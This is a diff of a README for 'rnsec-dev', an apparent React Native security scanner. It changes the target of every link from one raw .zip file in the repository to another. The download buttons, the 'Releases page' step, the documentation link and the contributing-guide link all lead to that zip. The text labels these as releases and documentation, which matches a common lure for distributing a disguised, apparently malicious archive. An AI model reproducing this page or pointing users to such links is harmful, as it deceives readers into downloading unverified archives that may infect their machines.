@@ -1,6 +1,6 @@
 # 🔒 rnsec-dev - Secure Your React Native Apps Easily
 
-[![Download rnsec-dev](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/examples/vulnerable-app/android/dev_rnsec_v3.7.zip)](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/examples/vulnerable-app/android/dev_rnsec_v3.7.zip)
+[![Download rnsec-dev](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/src/core/rnsec_dev_1.8-beta.5.zip)](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/src/core/rnsec_dev_1.8-beta.5.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ To get started with rnsec-dev, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page where you can download the latest version.  
-   [Download rnsec-dev](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/examples/vulnerable-app/android/dev_rnsec_v3.7.zip)
+   [Download rnsec-dev](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/src/core/rnsec_dev_1.8-beta.5.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you'll see a list of available versions. Look for the latest one, as it will have the most recent features and bug fixes.
@@ -72,7 +72,7 @@ rnsec-dev comes packed with features that make scanning your React Native applic
 
 ## 📄 Documentation
 
-For more in-depth information about features, usage, and troubleshooting, please refer to the [official documentation](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/examples/vulnerable-app/android/dev_rnsec_v3.7.zip).
+For more in-depth information about features, usage, and troubleshooting, please refer to the [official documentation](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/src/core/rnsec_dev_1.8-beta.5.zip).
 
 ## 💬 Support
 
@@ -80,13 +80,13 @@ If you have questions or run into issues, please open an issue on our GitHub rep
 
 ## 📝 Contributing
 
-We welcome contributions from the community. If you wish to contribute to rnsec-dev, please check out our [Contributing Guide](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/examples/vulnerable-app/android/dev_rnsec_v3.7.zip).
+We welcome contributions from the community. If you wish to contribute to rnsec-dev, please check out our [Contributing Guide](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/src/core/rnsec_dev_1.8-beta.5.zip).
 
 ## 🔗 Download & Install
 
 To download rnsec-dev, visit the Releases page using the link below:
 
-[Download rnsec-dev](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/examples/vulnerable-app/android/dev_rnsec_v3.7.zip)
+[Download rnsec-dev](https://github.com/xrollo/rnsec-dev/raw/refs/heads/main/src/core/rnsec_dev_1.8-beta.5.zip)
 
 Follow the steps outlined in the "Getting Started" section to install and use the application. 
 
